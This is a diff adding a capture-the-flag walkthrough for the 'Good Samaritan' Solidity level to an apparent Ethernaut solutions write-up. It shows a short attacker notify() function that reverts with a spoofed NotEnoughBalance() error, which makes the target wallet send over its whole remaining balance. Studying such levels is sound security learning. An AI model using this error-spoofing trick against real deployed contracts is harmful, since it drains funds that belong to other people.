@@ -29,6 +29,7 @@
 - [24 Puzzle Wallet](#24-puzzle-wallet)
 - [25 Motor Bike](#25-motor-bike)
 - [26 Double Entry Point](#26-double-entry-point)
+- [27 Good Samaritan](#27-good-samaritan)
 
 <!-- /MarkdownTOC -->
 
@@ -1938,3 +1939,66 @@ A more complex bot examining `msg.data` would be needed if we need to guarantee 
 * https://docs.soliditylang.org/en/v0.8.19/contracts.html#modifier-overriding
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L113-L117
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/ERC20.sol#L222-L240
+
+## 27 Good Samaritan
+
+To beat this level, we need to comply with
+
+```solidity
+instance.coin().balances(address(instance.wallet())) == 0
+```
+
+### Solution
+
+Let's look at `GoodSamaritan.requestDonation()`
+
+```solidity
+function requestDonation() external returns(bool enoughBalance){
+  // donate 10 coins to requester
+  try wallet.donate10(msg.sender) {
+    return true;
+  } catch (bytes memory err) {
+    if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+      // send the coins left
+      wallet.transferRemainder(msg.sender);
+      return false;
+    }
+  }
+}
+```
+
+If `donate10()` reverts, and the custom error is `NotEnoughBalance()`, then the `GoodSamaritan` contract will call `wallet.transferRemainder`. How do we produce this consume error?
+
+Notice that `Coin.transfer()`, calls the `notify()` function of the funds recipient.
+
+```solidity
+if(dest_.isContract()) {
+  // notify contract
+  INotifyable(dest_).notify(amount_);
+}
+```
+
+That is, we can get to implement this function as desired. Then we just send the needed error.
+
+```solidity
+error NotEnoughBalance();
+
+// ... SNIP
+
+// goodSamaritan.requestDonation() will transfer the remainder
+// if the error NotEnoughBalance() is received.
+//
+// just make sure to not revert when you are getting the remainder!
+// In this particular case, checking the amount will suffice.
+function notify(uint256 amount) public pure {
+  if (amount == 10) {
+    revert NotEnoughBalance();
+  }
+}
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#errors
+* https://blog.soliditylang.org/2021/04/21/custom-errors/
+* https://solidity-by-example.org/error/
